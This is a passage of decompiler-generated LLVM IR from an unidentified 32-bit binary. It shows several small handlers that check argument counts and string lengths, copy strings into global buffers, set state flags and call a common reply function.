  %v2_8048d90 = add nsw i32 %storemerge598, -5188
  %v3_8048d90 = add i32 %v2_8048d90, %v0_8048d90
  %v4_8048d90 = inttoptr i32 %v3_8048d90 to i8*
  %v5_8048d90 = load i8, i8* %v4_8048d90, align 1
  %v3_8048d97 = inttoptr i32 %v3_8048d8a to i8*
  store i8 %v5_8048d90, i8* %v3_8048d97, align 1
  %v0_8048d99 = load i32, i32* %edx.global-to-local, align 4
  %v1_8048d99 = add i32 %v0_8048d99, 1
  store i32 %v1_8048d99, i32* @edx, align 4
  store i32 %v1_8048d99, i32* %v2_8048d7a.pre-phi, align 4
  br label %dec_label_pc_8048de0

dec_label_pc_8048da2:                             ; preds = %dec_label_pc_8048d77
  %v0_8048da5 = load i32, i32* @ebp, align 4
  %v2_8048da5 = add nsw i32 %storemerge598, -5188
  %v3_8048da5 = add i32 %v2_8048da5, %v0_8048da5
  %v4_8048da5 = inttoptr i32 %v3_8048da5 to i8*
  %v5_8048da5 = load i8, i8* %v4_8048da5, align 1
  %v0_8048db1 = load i32, i32* @esp, align 4
  %v5_8048db1 = icmp ult i32 %v0_8048db1, 8
  store i1 %v5_8048db1, i1* %cf.global-to-local, align 1
  %v4_8048db8 = call i32 @function_804ccc8(i8 %v5_8048da5, i32 %v3_8048bc0)
  %v0_8048dbd = load i32, i32* @esp, align 4
  %v2_8048dbd = icmp ugt i32 %v0_8048dbd, -17
  store i1 %v2_8048dbd, i1* %cf.global-to-local, align 1
  br label %dec_label_pc_8048de0

dec_label_pc_8048dc2:                             ; preds = %dec_label_pc_8048d67
  %v0_8048dc5 = load i32, i32* @ebp, align 4
  %v2_8048dc5 = add nsw i32 %storemerge598, -5188
  %v3_8048dc5 = add i32 %v2_8048dc5, %v0_8048dc5
  %v4_8048dc5 = inttoptr i32 %v3_8048dc5 to i8*
  %v5_8048dc5 = load i8, i8* %v4_8048dc5, align 1
  %v0_8048dd1 = load i32, i32* @esp, align 4
  %v5_8048dd1 = icmp ult i32 %v0_8048dd1, 8
  store i1 %v5_8048dd1, i1* %cf.global-to-local, align 1
  %v4_8048dd8 = call i32 @function_804c9a0(i8 %v5_8048dc5, i32 %v3_8048bc0)
  %v0_8048ddd = load i32, i32* @esp, align 4
  %v2_8048ddd = icmp ugt i32 %v0_8048ddd, -17
  store i1 %v2_8048ddd, i1* %cf.global-to-local, align 1
  br label %dec_label_pc_8048de0

dec_label_pc_8048de0:                             ; preds = %dec_label_pc_8048da2, %dec_label_pc_8048d87, %dec_label_pc_8048dc2
  %v4_8048de0 = add nuw nsw i32 %storemerge598, 1
  %v10_8048de6 = icmp ult i32 %v4_8048de0, %v5_8048d35102
  store i1 %v10_8048de6, i1* %cf.global-to-local, align 1
  %exitcond = icmp eq i32 %v4_8048de0, %v5_8048d35102
  br i1 %exitcond, label %dec_label_pc_8048d24.loopexit, label %dec_label_pc_8048d67

dec_label_pc_8048df4:                             ; preds = %dec_label_pc_8048d24.loopexit, %dec_label_pc_8048d08
  store i1 %v5_8048aab, i1* %cf.global-to-local, align 1
  %v1_8048dfa = inttoptr i32 %v3_8048bc0 to i16*
  %v2_8048dfa = call i32 @function_804b4c4(i16* %v1_8048dfa)
  store i1 %v5_8048aab, i1* %cf.global-to-local, align 1
  %v1_8048e08 = call i32 @function_804b2bc(i32 %v4_8048991)
  store i32 %v1_8048e08, i32* @eax, align 4
  store i1 %v5_8048aab, i1* %cf.global-to-local, align 1
  %v1_8048e15 = call i32 @function_804e884(i32 0)
  br label %dec_label_pc_8048e1a

dec_label_pc_8048e1a:                             ; preds = %dec_label_pc_8048941, %dec_label_pc_8048df4
  %v0_8048e20 = phi i32 [ %v1_8048952, %dec_label_pc_8048941 ], [ %v1_8048e15, %dec_label_pc_8048df4 ]
  ret i32 %v0_8048e20

; uselistorder directives
  uselistorder i32 %storemerge598, { 0, 3, 2, 1 }
  uselistorder i32 %v4_8048d4a, { 1, 0 }
  uselistorder i32 %v5_8048d35102, { 0, 4, 5, 6, 3, 1, 2 }
  uselistorder i32* %v2_8048d7a.pre-phi, { 2, 1, 0 }
  uselistorder i32 %v4_8048cf4, { 1, 0, 2 }
  uselistorder i32 %v4_8048ce3, { 1, 2, 0 }
  uselistorder i32 %storemerge13.in106, { 0, 3, 2, 1 }
  uselistorder i1 %v0_8048c4d, { 1, 0 }
  uselistorder i32 %v7_8048c4b, { 1, 0 }
  uselistorder i32 %storemerge7110, { 2, 0, 3, 1 }
  uselistorder i32 %v4_8048bf1, { 1, 0 }
  uselistorder i32 %v5_8048bdc114, { 7, 8, 3, 0, 2, 1, 9, 10, 6, 4, 5 }
  uselistorder i32 %v2_8048bd2, { 3, 1, 5, 2, 4, 0 }
  uselistorder i32 %v3_8048bc0, { 10, 5, 6, 0, 1, 2, 3, 4, 8, 7, 9 }
  uselistorder i32 %v1_8048ab5, { 1, 0, 2 }
  uselistorder i1 %v5_8048aab, { 4, 5, 1, 3, 2, 0, 6 }
  uselistorder i32 %storemerge8, { 0, 2, 1, 4, 3 }
  uselistorder i32 %v2_8048a56.pre-phi, { 3, 0, 4, 2, 1 }
  uselistorder i1 %v0_80489f9, { 1, 0 }
  uselistorder i32 %v4_8048991, { 3, 4, 1, 5, 0, 6, 7, 2, 8 }
  uselistorder i32 %v4_8048962, { 1, 0 }
  uselistorder i1 %v5_804894c, { 1, 0, 2 }
  uselistorder i32* %stack_var_-5228, { 0, 1, 3, 2 }
  uselistorder i32* %stack_var_-5244, { 0, 3, 1, 2, 4, 5, 6, 7, 8, 9, 11, 10 }
  uselistorder i32* %stack_var_-1096, { 0, 2, 1, 3 }
  uselistorder i32* %stack_var_-68, { 1, 0, 2 }
  uselistorder i32* %edx.global-to-local, { 2, 3, 4, 5, 6, 7, 8, 0, 1 }
  uselistorder i1* %cf.global-to-local, { 5, 34, 35, 42, 36, 37, 38, 39, 40, 41, 0, 43, 44, 1, 45, 46, 57, 53, 47, 48, 49, 50, 51, 52, 2, 54, 55, 56, 3, 58, 59, 4, 60, 61, 62, 63, 64, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 22, 21, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33 }
  uselistorder i32 -1092, { 1, 0 }
  uselistorder i32* inttoptr (i32 4 to i32*), { 4, 0, 1, 2, 3 }
  uselistorder i32 %arg4, { 2, 3, 0, 1 }
  uselistorder i32 %arg3, { 1, 0, 2, 3 }
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder i32 %arg1, { 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_8048e1a, { 1, 0 }
  uselistorder label %dec_label_pc_8048de0, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8048d4a, { 1, 0 }
  uselistorder label %dec_label_pc_8048d08, { 2, 1, 0 }
  uselistorder label %dec_label_pc_8048ce3, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8048c6a, { 1, 0 }
  uselistorder label %dec_label_pc_8048c11, { 1, 0 }
  uselistorder label %dec_label_pc_8048bf1, { 1, 0 }
  uselistorder label %dec_label_pc_8048b71, { 1, 0 }
  uselistorder label %dec_label_pc_8048b26, { 1, 0 }
  uselistorder label %dec_label_pc_8048b01, { 1, 0 }
  uselistorder label %dec_label_pc_8048a53, { 1, 0 }
  uselistorder label %dec_label_pc_8048a47, { 1, 0 }
  uselistorder label %dec_label_pc_80489c2, { 1, 0 }
  uselistorder label %dec_label_pc_8048988, { 1, 0 }
}

define i32 @function_8048e21(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_8048e21:
  %tmp32 = call i8 @__decompiler_undefined_function_5()
  %tmp33 = call i8 @__decompiler_undefined_function_5()
  %tmp46 = call i8 @__decompiler_undefined_function_5()
  %v0_8048e32 = load i64, i64* @global_var_8055a4c.12, align 8
  %v1_8048e32 = trunc i64 %v0_8048e32 to i32
  %v9_8048e49 = icmp eq i32 %v1_8048e32, 1
  %v1_8048e4c = icmp eq i1 %v9_8048e49, false
  br i1 %v1_8048e4c, label %dec_label_pc_8048ea2, label %dec_label_pc_8048e4e

dec_label_pc_8048e4e:                             ; preds = %dec_label_pc_8048e21
  %v3_8048e5e16 = zext i8 %tmp46 to i32
  store i32 %v3_8048e5e16, i32* @ebx, align 4
  %v3_8048e95 = call i32 @function_80482b2(i32 %arg1, i32 ptrtoint ([32 x i8]* @global_var_80520b0.27 to i32))
  br label %dec_label_pc_8048f4a

dec_label_pc_8048ea2:                             ; preds = %dec_label_pc_8048e21
  %v0_8048e2a = load i8*, i8** @global_var_8055a48.11, align 4
  %v1_8048e2a = ptrtoint i8* %v0_8048e2a to i32
  %v3_8048ec121 = zext i8 %tmp33 to i32
  store i32 %v3_8048ec121, i32* @ebx, align 4
  %v4_8048ed5 = zext i8 %tmp32 to i32
  store i32 %v4_8048ed5, i32* @esi, align 4
  %v1_8048eea = urem i32 %v1_8048e2a, 256
  store i32 %v1_8048eea, i32* @edi, align 4
  %v3_8048f42 = call i32 @function_80482b2(i32 %arg1, i32 ptrtoint ([46 x i8]* @global_var_80520d0.28 to i32))
  br label %dec_label_pc_8048f4a

dec_label_pc_8048f4a:                             ; preds = %dec_label_pc_8048e4e, %dec_label_pc_8048ea2
  %v0_8048f51 = phi i32 [ %v3_8048f42, %dec_label_pc_8048ea2 ], [ %v3_8048e95, %dec_label_pc_8048e4e ]
  ret i32 %v0_8048f51

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_8048f4a, { 1, 0 }
}

define i32 @function_8048f52(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_8048f52:
  %v3_8048f66 = call i32 @function_80482b2(i32 %arg1, i32 ptrtoint ([29 x i8]* @global_var_80520fe.29 to i32))
  ret i32 %v3_8048f66
}

define i32 @function_8048f70(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_8048f70:
  %v12_8048f77 = icmp eq i32 %arg3, 1
  br i1 %v12_8048f77, label %dec_label_pc_8048f95, label %dec_label_pc_8048f7d

dec_label_pc_8048f7d:                             ; preds = %dec_label_pc_8048f70
  %v3_8048f8b = call i32 @function_80482b2(i32 %arg1, i32 ptrtoint ([24 x i8]* @global_var_805211b.30 to i32))
  br label %dec_label_pc_8048feb

dec_label_pc_8048f95:                             ; preds = %dec_label_pc_8048f70
  %v1_8048f98 = add i32 %arg4, 4
  %v1_8048f9b = inttoptr i32 %v1_8048f98 to i32*
  %v2_8048f9b = load i32, i32* %v1_8048f9b, align 4
  store i1 false, i1* @df, align 1
  %v4_8048fa8 = inttoptr i32 %v2_8048f9b to i8*
  store i32 %v2_8048f9b, i32* @edi, align 4
  %v3_8048fab = call i32 @_strlen(i8* %v4_8048fa8)
  %v4_8048fab = mul i32 %v3_8048fab, -1
  %v1_8048fb1 = sub i32 0, %v4_8048fab
  %v5_8048fb2 = icmp ult i32 %v1_8048fb1, 9
  %v9_8048fb2 = icmp eq i32 %v4_8048fab, -9
  %v2_8048fb5 = or i1 %v5_8048fb2, %v9_8048fb2
  br i1 %v2_8048fb5, label %dec_label_pc_8048fcf, label %dec_label_pc_8048fb7

dec_label_pc_8048fb7:                             ; preds = %dec_label_pc_8048f95
  %v3_8048fc5 = call i32 @function_80482b2(i32 %arg1, i32 ptrtoint ([53 x i8]* @global_var_8052134.31 to i32))
  br label %dec_label_pc_8048feb

dec_label_pc_8048fcf:                             ; preds = %dec_label_pc_8048f95
  %v3_8048fe3 = call i32 @function_80482b2(i32 %arg1, i32 ptrtoint ([9 x i8]* @global_var_8052169.32 to i32))
  br label %dec_label_pc_8048feb

dec_label_pc_8048feb:                             ; preds = %dec_label_pc_8048fb7, %dec_label_pc_8048f7d, %dec_label_pc_8048fcf
  %v0_8048fef = phi i32 [ %v3_8048fc5, %dec_label_pc_8048fb7 ], [ %v3_8048f8b, %dec_label_pc_8048f7d ], [ %v3_8048fe3, %dec_label_pc_8048fcf ]
  ret i32 %v0_8048fef

; uselistorder directives
  uselistorder i32 %arg1, { 2, 1, 0 }
  uselistorder label %dec_label_pc_8048feb, { 2, 0, 1 }
}

define i32 @function_8048ff0(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_8048ff0:
  %v12_8048ff7 = icmp eq i32 %arg3, 1
  br i1 %v12_8048ff7, label %dec_label_pc_8049047, label %dec_label_pc_8048ffd

dec_label_pc_8048ffd:                             ; preds = %dec_label_pc_8048ff0
  %v3_804900b = call i32 @function_80482b2(i32 %arg1, i32 ptrtoint ([27 x i8]* @global_var_8052172.33 to i32))
  %v3_804903a = call i32 @function_80482b2(i32 %arg1, i32 ptrtoint ([35 x i8]* @global_var_80521b4.36 to i32))
  br label %dec_label_pc_80490f3

dec_label_pc_8049047:                             ; preds = %dec_label_pc_8048ff0
  %v0_8049047 = load i8, i8* @global_var_8055a44.6, align 4
  %v4_804904c = icmp eq i8 %v0_8049047, 0
  br i1 %v4_804904c, label %dec_label_pc_804906b, label %dec_label_pc_8049050

dec_label_pc_8049050:                             ; preds = %dec_label_pc_8049047
  %v3_804905e = call i32 @function_80482b2(i32 %arg1, i32 ptrtoint ([30 x i8]* @global_var_80521d7.37 to i32))
  br label %dec_label_pc_80490f3

dec_label_pc_804906b:                             ; preds = %dec_label_pc_8049047
  %v1_804906e = add i32 %arg4, 4
  %v1_8049071 = inttoptr i32 %v1_804906e to i32*
  %v2_8049071 = load i32, i32* %v1_8049071, align 4
  store i1 false, i1* @df, align 1
  %v4_804907e = inttoptr i32 %v2_8049071 to i8*
  store i32 %v2_8049071, i32* @edi, align 4
  %v3_8049081 = call i32 @_strlen(i8* %v4_804907e)
  %v4_8049081 = mul i32 %v3_8049081, -1
  %v1_8049087 = sub i32 0, %v4_8049081
  %v5_8049088 = icmp ult i32 %v1_8049087, 254
  %v9_8049088 = icmp eq i32 %v4_8049081, -254
  %v2_804908d = or i1 %v5_8049088, %v9_8049088
  br i1 %v2_804908d, label %dec_label_pc_80490a7, label %dec_label_pc_804908f

dec_label_pc_804908f:                             ; preds = %dec_label_pc_804906b
  %v3_804909d = call i32 @function_80482b2(i32 %arg1, i32 ptrtoint ([37 x i8]* @global_var_80521f8.38 to i32))
  br label %dec_label_pc_80490f3

dec_label_pc_80490a7:                             ; preds = %dec_label_pc_804906b
  store i8 1, i8* @global_var_8055a44.6, align 4
  %v5_80490bf = call i32 @function_804ce60(i8* bitcast (i32* @global_var_8058100.39 to i8*), i32 0, i32 256)
  %v2_80490cd = load i32, i32* %v1_8049071, align 4
  store i32 %v2_80490cd, i32* @eax, align 4
  %v4_80490d8 = call i32 @function_804ce78(i8* bitcast (i32* @global_var_8058100.39 to i8*), i32 %v2_80490cd)
  %v3_80490eb = call i32 @function_80482b2(i32 %arg1, i32 ptrtoint ([31 x i8]* @global_var_8052220.40 to i32))
  br label %dec_label_pc_80490f3

dec_label_pc_80490f3:                             ; preds = %dec_label_pc_804908f, %dec_label_pc_8049050, %dec_label_pc_8048ffd, %dec_label_pc_80490a7
  %v0_80490f7 = phi i32 [ %v3_804909d, %dec_label_pc_804908f ], [ %v3_804905e, %dec_label_pc_8049050 ], [ %v3_804903a, %dec_label_pc_8048ffd ], [ %v3_80490eb, %dec_label_pc_80490a7 ]
  ret i32 %v0_80490f7

; uselistorder directives
  uselistorder i32 %arg1, { 4, 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_80490f3, { 3, 0, 1, 2 }
}

define i32 @function_80490f8(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_80490f8:
  %v12_80490fe = icmp eq i32 %arg3, 1
  br i1 %v12_80490fe, label %dec_label_pc_804914b, label %dec_label_pc_8049104

dec_label_pc_8049104:                             ; preds = %dec_label_pc_80490f8
  %v3_8049112 = call i32 @function_80482b2(i32 %arg1, i32 ptrtoint ([26 x i8]* @global_var_805223f.41 to i32))
  %v3_8049141 = call i32 @function_80482b2(i32 %arg1, i32 ptrtoint ([35 x i8]* @global_var_80521b4.36 to i32))
  br label %dec_label_pc_80491be

dec_label_pc_804914b:                             ; preds = %dec_label_pc_80490f8
  %v0_804914b = load i8, i8* @global_var_8055a44.6, align 4
  %v4_8049150 = icmp eq i8 %v0_804914b, 0
  %v1_8049152 = icmp eq i1 %v4_8049150, false
  br i1 %v1_8049152, label %dec_label_pc_804916c, label %dec_label_pc_8049154

dec_label_pc_8049154:                             ; preds = %dec_label_pc_804914b
  %v3_8049162 = call i32 @function_80482b2(i32 %arg1, i32 ptrtoint ([29 x i8]* @global_var_8052259.42 to i32))
  br label %dec_label_pc_80491be

dec_label_pc_804916c:                             ; preds = %dec_label_pc_804914b
  %v1_804916f = add i32 %arg4, 4
  %v1_8049172 = inttoptr i32 %v1_804916f to i32*
  %v2_8049172 = load i32, i32* %v1_8049172, align 4
  %v4_804917d = call i32 @function_804cfdc(i8* bitcast (i32* @global_var_8058100.39 to i8*), i32 %v2_8049172)
  %v1_8049185 = icmp eq i32 %v4_804917d, 0
  br i1 %v1_8049185, label %dec_label_pc_80491a1, label %dec_label_pc_8049189

dec_label_pc_8049189:                             ; preds = %dec_label_pc_804916c
  %v3_8049197 = call i32 @function_80482b2(i32 %arg1, i32 ptrtoint ([27 x i8]* @global_var_8052276.43 to i32))
  br label %dec_label_pc_80491be

dec_label_pc_80491a1:                             ; preds = %dec_label_pc_804916c
  store i8 0, i8* @global_var_8055a44.6, align 4
  %v3_80491b6 = call i32 @function_80482b2(i32 %arg1, i32 ptrtoint ([30 x i8]* @global_var_8052291.44 to i32))
  br label %dec_label_pc_80491be

dec_label_pc_80491be:                             ; preds = %dec_label_pc_8049189, %dec_label_pc_8049154, %dec_label_pc_8049104, %dec_label_pc_80491a1
  %v0_80491bf = phi i32 [ %v3_8049197, %dec_label_pc_8049189 ], [ %v3_8049162, %dec_label_pc_8049154 ], [ %v3_8049141, %dec_label_pc_8049104 ], [ %v3_80491b6, %dec_label_pc_80491a1 ]
  ret i32 %v0_80491bf

; uselistorder directives
  uselistorder i8* bitcast (i32* @global_var_8058100.39 to i8*), { 1, 2, 0 }
  uselistorder i8* @global_var_8055a44.6, { 4, 3, 2, 1, 0 }
  uselistorder i32 %arg1, { 4, 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_80491be, { 3, 0, 1, 2 }
}

define i32 @function_80491c0(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_80491c0:
  %eax.global-to-local = alloca i32, align 4
  %stack_var_-512 = alloca i32, align 4
  %stack_var_-276 = alloca i32, align 4
  %v12_80491ca = icmp eq i32 %arg3, 1
  br i1 %v12_80491ca, label %dec_label_pc_80491ff, label %dec_label_pc_80491d0

dec_label_pc_80491d0:                             ; preds = %dec_label_pc_80491c0
  %v3_80491de = call i32 @function_80482b2(i32 %arg1, i32 ptrtoint ([31 x i8]* @global_var_80522b0.45 to i32))
  store i32 %v3_80491de, i32* %eax.global-to-local, align 4
  store i8* null, i8** @global_var_8055a48.11, align 8
  store i64 0, i64* @global_var_8055a4c.12, align 8
  br label %dec_label_pc_8049396

dec_label_pc_80491ff:                             ; preds = %dec_label_pc_80491c0
  %v1_8049202 = add i32 %arg4, 4
  store i32 %v1_8049202, i32* %eax.global-to-local, align 4
  %v1_8049205 = inttoptr i32 %v1_8049202 to i32*
  %v2_8049205 = load i32, i32* %v1_8049205, align 4
  %v1_8049212 = and i32 %v2_8049205, -256
  store i32 %v1_8049212, i32* %eax.global-to-local, align 4
  store i1 false, i1* @df, align 1
  %v4_8049215 = inttoptr i32 %v2_8049205 to i8*
  store i32 %v2_8049205, i32* @edi, align 4
  %v3_804921b = call i32 @_strlen(i8* %v4_8049215)
  %v4_804921b = mul i32 %v3_804921b, -1
  %v1_8049221 = sub i32 0, %v4_804921b
  store i32 %v1_8049221, i32* %eax.global-to-local, align 4
  %v2_8049222 = icmp ult i32 %v1_8049221, 16
  %v6_8049222 = icmp eq i32 %v4_804921b, -16
  %v2_8049225 = or i1 %v2_8049222, %v6_8049222
  br i1 %v2_8049225, label %dec_label_pc_8049242, label %dec_label_pc_8049227

dec_label_pc_8049227:                             ; preds = %dec_label_pc_80491ff
  %v3_8049235 = call i32 @function_80482b2(i32 %arg1, i32 ptrtoint ([75 x i8]* @global_var_80522d0.46 to i32))
  store i32 %v3_8049235, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8049396

dec_label_pc_8049242:                             ; preds = %dec_label_pc_80491ff
  store i32 %v1_8049202, i32* %eax.global-to-local, align 4
  %v2_8049248 = load i32, i32* %v1_8049205, align 4
  %v2_804924e = ptrtoint i32* %stack_var_-276 to i32
  store i32 %v2_804924e, i32* @eax, align 4
  %v3_8049255 = bitcast i32* %stack_var_-276 to i8*
  %v4_8049255 = call i32 @function_804ce78(i8* %v3_8049255, i32 %v2_8049248)
  %v2_804926e = ptrtoint i32* %stack_var_-512 to i32
  store i32 %v2_804926e, i32* %eax.global-to-local, align 4
  %v3_8049277 = call i32 @_strlen(i8* %v3_8049255)
  %v1_804927e = add i32 %v3_8049277, -1
  store i32 %v1_804927e, i32* %eax.global-to-local, align 4
  %v0_804927f = load i32, i32* @ebp, align 4
  %v2_804927f = add i32 %v3_8049277, -273
  %v3_804927f = add i32 %v2_804927f, %v0_804927f
  %v4_804927f = inttoptr i32 %v3_804927f to i8*
  %v5_804927f = load i8, i8* %v4_804927f, align 1
  %v6_804927f = zext i8 %v5_804927f to i32
  %v8_804927f = and i32 %v1_804927e, -256
  %v9_804927f = or i32 %v6_804927f, %v8_804927f
  store i32 %v9_804927f, i32* %eax.global-to-local, align 4
  %v10_8049286 = icmp eq i8 %v5_804927f, 46
  %v1_8049288 = icmp eq i1 %v10_8049286, false
  br i1 %v1_8049288, label %dec_label_pc_80492d8, label %dec_label_pc_804928a

dec_label_pc_804928a:                             ; preds = %dec_label_pc_8049242
  store i32 %v2_804926e, i32* %eax.global-to-local, align 4
  %v3_80492a4 = call i32 @_strlen(i8* %v3_8049255)
  %v1_80492ab = add i32 %v3_80492a4, -1
  store i32 %v1_80492ab, i32* %eax.global-to-local, align 4
  %v0_80492ac = load i32, i32* @ebp, align 4
  %v2_80492ac = add i32 %v3_80492a4, -273
  %v3_80492ac = add i32 %v2_80492ac, %v0_80492ac
  %v4_80492ac = inttoptr i32 %v3_80492ac to i8*
  store i8 0, i8* %v4_80492ac, align 1
  br label %dec_label_pc_80492d8

dec_label_pc_80492c4:                             ; preds = %dec_label_pc_80492d8
  store i32 %stack_var_-20.0, i32* %eax.global-to-local, align 4
  %v0_80492c7 = load i32, i32* @ebp, align 4
  %v2_80492c7 = add i32 %stack_var_-20.0, -272
  %v3_80492c7 = add i32 %v2_80492c7, %v0_80492c7
  %v4_80492c7 = inttoptr i32 %v3_80492c7 to i8*
  %v5_80492c7 = load i8, i8* %v4_80492c7, align 1
  %v6_80492c7 = zext i8 %v5_80492c7 to i32
  %v8_80492c7 = and i32 %stack_var_-20.0, -256
  %v9_80492c7 = or i32 %v6_80492c7, %v8_80492c7
  store i32 %v9_80492c7, i32* %eax.global-to-local, align 4
  %v10_80492ce = icmp eq i8 %v5_80492c7, 46
  %v4_80492d2 = zext i1 %v10_80492ce to i32
  %stack_var_-16.1.v4_80492d2 = add i32 %v4_80492d2, %stack_var_-16.1
  %v4_80492d5 = add i32 %stack_var_-20.0, 1
  br label %dec_label_pc_80492d8

dec_label_pc_80492d8:                             ; preds = %dec_label_pc_804928a, %dec_label_pc_8049242, %dec_label_pc_80492c4
  %stack_var_-16.1 = phi i32 [ %stack_var_-16.1.v4_80492d2, %dec_label_pc_80492c4 ], [ 1, %dec_label_pc_8049242 ], [ 1, %dec_label_pc_804928a ]
  %stack_var_-20.0 = phi i32 [ %v4_80492d5, %dec_label_pc_80492c4 ], [ 0, %dec_label_pc_8049242 ], [ 0, %dec_label_pc_804928a ]
  store i32 %stack_var_-20.0, i32* @edx, align 4
  store i32 %v2_804926e, i32* %eax.global-to-local, align 4
  %v3_80492f5 = call i32 @_strlen(i8* %v3_8049255)
  store i32 %v3_80492f5, i32* %eax.global-to-local, align 4
  %v0_80492fc = load i32, i32* @edx, align 4
  %v7_80492fc = icmp ult i32 %v0_80492fc, %v3_80492f5
  br i1 %v7_80492fc, label %dec_label_pc_80492c4, label %dec_label_pc_8049300

dec_label_pc_8049300:                             ; preds = %dec_label_pc_80492d8
  %v5_8049305 = sub i32 4, %stack_var_-16.1
  %v15_8049305 = icmp eq i32 %v5_8049305, 0
  store i32 0, i32* %eax.global-to-local, align 4
  %v5_804935027 = icmp sgt i32 %v5_8049305, 0
  br i1 %v5_804935027, label %dec_label_pc_8049314, label %dec_label_pc_8049352

dec_label_pc_8049314:                             ; preds = %dec_label_pc_8049300, %dec_label_pc_8049314
  %storemerge228 = phi i32 [ %v4_8049347, %dec_label_pc_8049314 ], [ 0, %dec_label_pc_8049300 ]
  store i32 %v2_804924e, i32* @edx, align 4
  store i32 %v2_804926e, i32* %eax.global-to-local, align 4
  %v3_8049334 = call i32 @_strlen(i8* %v3_8049255)
  %v0_804933b = load i32, i32* @edx, align 4
  %v0_804933b29 = add i32 %v0_804933b, %v3_8049334
  store i32 %v0_804933b29, i32* %eax.global-to-local, align 4
  %v1_804933e = inttoptr i32 %v0_804933b29 to i16*
  store i16 12334, i16* %v1_804933e, align 2
  %v0_8049343 = load i32, i32* %eax.global-to-local, align 4
  %v1_8049343 = add i32 %v0_8049343, 2
  %v2_8049343 = inttoptr i32 %v1_8049343 to i8*
  store i8 0, i8* %v2_8049343, align 1
  %v4_8049347 = add nuw nsw i32 %storemerge228, 1
  store i32 %v4_8049347, i32* %eax.global-to-local, align 4
  %exitcond = icmp eq i32 %v4_8049347, %v5_8049305
  br i1 %exitcond, label %dec_label_pc_8049352, label %dec_label_pc_8049314

dec_label_pc_8049352:                             ; preds = %dec_label_pc_8049314, %dec_label_pc_8049300
  store i32 %v2_804924e, i32* @eax, align 4
  %v2_804935c = call i32 @function_804d120(i8* %v3_8049255)
  store i32 %v2_804935c, i32* %eax.global-to-local, align 4
  %v1_804936b = icmp eq i1 %v15_8049305, false
  br i1 %v1_804936b, label %dec_label_pc_8049379, label %dec_label_pc_804938e

dec_label_pc_8049379:                             ; preds = %dec_label_pc_8049352
  %v3_8049381 = call i32 @function_8048878(i64 256, i32 %v5_8049305)
  store i32 %v3_8049381, i32* %eax.global-to-local, align 4
  %v1_8049389 = sext i32 %v3_8049381 to i64
  br label %dec_label_pc_804938e

dec_label_pc_804938e:                             ; preds = %dec_label_pc_8049352, %dec_label_pc_8049379
  %storemerge = phi i64 [ %v1_8049389, %dec_label_pc_8049379 ], [ 1, %dec_label_pc_8049352 ]
  store i64 %storemerge, i64* @global_var_8055a4c.12, align 8
  store i32 %v2_804935c, i32* %eax.global-to-local, align 4
  %v1_8049391 = inttoptr i32 %v2_804935c to i8*
  store i8* %v1_8049391, i8** @global_var_8055a48.11, align 8
  br label %dec_label_pc_8049396

dec_label_pc_8049396:                             ; preds = %dec_label_pc_8049227, %dec_label_pc_80491d0, %dec_label_pc_804938e
  %v0_804939a = phi i32 [ %v3_8049235, %dec_label_pc_8049227 ], [ %v3_80491de, %dec_label_pc_80491d0 ], [ %v2_804935c, %dec_label_pc_804938e ]
  ret i32 %v0_804939a

; uselistorder directives
  uselistorder i32 %v2_804935c, { 0, 2, 1, 3 }
  uselistorder i32 %v4_8049347, { 1, 2, 0 }
  uselistorder i32 %v5_8049305, { 2, 0, 1, 3 }
  uselistorder i32 %stack_var_-20.0, { 4, 2, 0, 3, 1 }
  uselistorder i32 %v2_804926e, { 1, 2, 0, 3 }
  uselistorder i8* %v3_8049255, { 1, 2, 3, 0, 4, 5 }
  uselistorder i32 %v1_8049221, { 1, 0 }
  uselistorder i32* %eax.global-to-local, { 0, 1, 2, 6, 3, 4, 5, 22, 9, 10, 7, 8, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_8049396, { 2, 0, 1 }
  uselistorder label %dec_label_pc_804938e, { 1, 0 }
  uselistorder label %dec_label_pc_8049314, { 1, 0 }
  uselistorder label %dec_label_pc_80492d8, { 2, 0, 1 }
}

define i32 @function_804939b(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_804939b:
  %v1_80493a7 = call i32 @function_804d200(i32 %arg2)
  store i32 %v1_80493a7, i32* @global_var_8055e60.47, align 32
  %v10_80493b9 = icmp eq i32 %v1_80493a7, -1
  %v1_80493bc = icmp eq i1 %v10_80493b9, false
  br i1 %v1_80493bc, label %dec_label_pc_804941b, label %dec_label_pc_80493be

dec_label_pc_80493be:                             ; preds = %dec_label_pc_804939b
  %v1_80493c4 = call i32 @function_804d228(i32 %arg2)
  %v4_80493cf = icmp eq i32 %v1_80493c4, 0
  %v1_80493d3 = icmp eq i1 %v4_80493cf, false
  br i1 %v1_80493d3, label %dec_label_pc_80493f8, label %dec_label_pc_80493d5

dec_label_pc_80493d5:                             ; preds = %dec_label_pc_80493be
  %v0_80493d5 = load i32, i32* @global_var_8058208.7, align 8
  %v2_80493e6 = call i32 @function_80482b2(i32 %v0_80493d5, i32 ptrtoint ([33 x i8]* @global_var_805231c.48 to i32))
  store i32 %v2_80493e6, i32* @eax, align 4
  %v1_80493f3 = call i32 @function_804e884(i32 0)
  br label %dec_label_pc_80493f8

dec_label_pc_80493f8:                             ; preds = %dec_label_pc_80493be, %dec_label_pc_80493d5
  %v1_80493fb = add i32 %v1_80493c4, 12
  %v2_80493fb = inttoptr i32 %v1_80493fb to i32*
  %v3_80493fb = load i32, i32* %v2_80493fb, align 4
